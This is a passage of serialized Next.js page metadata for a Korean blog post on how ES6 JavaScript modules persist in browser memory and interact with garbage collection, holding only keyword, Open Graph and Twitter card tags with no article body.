분석합니다.\"}],[\"$\",\"meta\",\"2\",{\"name\":\"author\",\"content\":\"지크\"}],[\"$\",\"meta\",\"3\",{\"name\":\"keywords\",\"content\":\"JavaScript, 메모리 관리, 동적 import, 성능 최적화, 메모리 누수, ES6 모듈, 가비지 컬렉션, 브라우저 메모리, 모듈 캐싱, V8 엔진, SPA, 웹 성능, 번들링, CommonJS, 웹 워커, 서비스 워커, 싱글톤 패턴, 라이브 바인딩, 모듈 시스템, 브라우저 엔진, 최적화, 캐싱, 웹개발\"}],[\"$\",\"meta\",\"4\",{\"name\":\"creator\",\"content\":\"지크\"}],[\"$\",\"meta\",\"5\",{\"name\":\"publisher\",\"content\":\"Blog\"}],[\"$\",\"meta\",\"6\",{\"name\":\"robots\",\"content\":\"index, follow\"}],[\"$\",\"meta\",\"7\",{\"name\":\"googlebot\",\"content\":\"index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1\"}],[\"$\",\"meta\",\"8\",{\"name\":\"google-site-verification\",\"content\":\"wjBK5vsP3u8w2Mb0BHXkojvPGQ56soPTBYg2fU5dg5k\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:title\",\"content\":\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성 | Blog\"}],[\"$\",\"meta\",\"10\",{\"property\":\"og:description\",\"content\":\"ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다.\"}],[\"$\",\"meta\",\"11\",{\"property\":\"og:url\",\"content\":\"https://leeduhan.github.io/posts/technology/2025-09-11-javascript-module-persistent-browser-memory\"}],[\"$\",\"meta\",\"12\",{\"property\":\"og:site_name\",\"content\":\"Blog\"}],[\"$\",\"meta\",\"13\",{\"property\":\"og:image\",\"content\":\"https://leeduhan.github.io/og-image.jpg\"}],[\"$\",\"meta\",\"14\",{\"property\":\"og:image:width\",\"content\":\"1200\"}],[\"$\",\"meta\",\"15\",{\"property\":\"og:image:height\",\"content\":\"630\"}],[\"$\",\"meta\",\"16\",{\"property\":\"og:image:alt\",\"content\":\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성\"}],[\"$\",\"meta\",\"17\",{\"property\":\"og:type\",\"content\":\"article\"}],[\"$\",\"meta\",\"18\",{\"property\":\"article:published_time\",\"content\":\"2025-09-11\"}],[\"$\",\"meta\",\"19\",{\"property\":\"article:author\",\"content\":\"지크\"}],[\"$\",\"meta\",\"20\",{\"property\":\"article:tag\",\"content\":\"JavaScript\"}],[\"$\",\"meta\",\"21\",{\"property\":\"article:tag\",\"content\":\"메모리 관리\"}],[\"$\",\"meta\",\"22\",{\"property\":\"article:tag\",\"content\":\"동적 import\"}],[\"$\",\"meta\",\"23\",{\"property\":\"article:tag\",\"content\":\"성능 최적화\"}],[\"$\",\"meta\",\"24\",{\"property\":\"article:tag\",\"content\":\"메모리 누수\"}],[\"$\",\"meta\",\"25\",{\"property\":\"article:tag\",\"content\":\"ES6 모듈\"}],[\"$\",\"meta\",\"26\",{\"property\":\"article:tag\",\"content\":\"가비지 컬렉션\"}],[\"$\",\"meta\",\"27\",{\"property\":\"article:tag\",\"content\":\"브라우저 메모리\"}],[\"$\",\"meta\",\"28\",{\"property\":\"article:tag\",\"content\":\"모듈 캐싱\"}],[\"$\",\"meta\",\"29\",{\"property\":\"article:tag\",\"content\":\"V8 엔진\"}],[\"$\",\"meta\",\"30\",{\"property\":\"article:tag\",\"content\":\"SPA\"}],[\"$\",\"meta\",\"31\",{\"property\":\"article:tag\",\"content\":\"웹 성능\"}],[\"$\",\"meta\",\"32\",{\"property\":\"article:tag\",\"content\":\"번들링\"}],[\"$\",\"meta\",\"33\",{\"property\":\"article:tag\",\"content\":\"CommonJS\"}],[\"$\",\"meta\",\"34\",{\"property\":\"article:tag\",\"content\":\"웹 워커\"}],[\"$\",\"meta\",\"35\",{\"property\":\"article:tag\",\"content\":\"서비스 워커\"}],[\"$\",\"meta\",\"36\",{\"property\":\"article:tag\",\"content\":\"싱글톤 패턴\"}],[\"$\",\"meta\",\"37\",{\"property\":\"article:tag\",\"content\":\"라이브 바인딩\"}],[\"$\",\"meta\",\"38\",{\"property\":\"article:tag\",\"content\":\"모듈 시스템\"}],[\"$\",\"meta\",\"39\",{\"property\":\"article:tag\",\"content\":\"브라우저 엔진\"}],[\"$\",\"meta\",\"40\",{\"property\":\"article:tag\",\"content\":\"최적화\"}],[\"$\",\"meta\",\"41\",{\"property\":\"article:tag\",\"content\":\"캐싱\"}],[\"$\",\"meta\",\"42\",{\"property\":\"article:tag\",\"content\":\"웹개발\"}],[\"$\",\"meta\",\"43\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"44\",{\"name\":\"twitter:creator\",\"content\":\"@지크\"}],[\"$\",\"meta\",\"45\",{\"name\":\"twitter:title\",\"content\":\"JavaScript 모듈의 영구적인 브라우저 메모리 지속성 | Blog\"}],[\"$\",\"meta\",\"46\",{\"name\":\"twitter:description\",\"content\":\"ES6 모듈의 메모리 지속성 메커니즘과 가비지 컬렉션 동작, 실무 관리 전략을 포괄적으로 분석합니다.\"}],[\"$\",\"meta\",\"47\",{\"name\":\"twitter:image\",\"content\":\"https://leeduhan.github.io/og-image.jpg\"}],[\"$\",\"link\",\"48\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"16x16\"}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"10:{\"metadata\":\"$16:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script></body></html>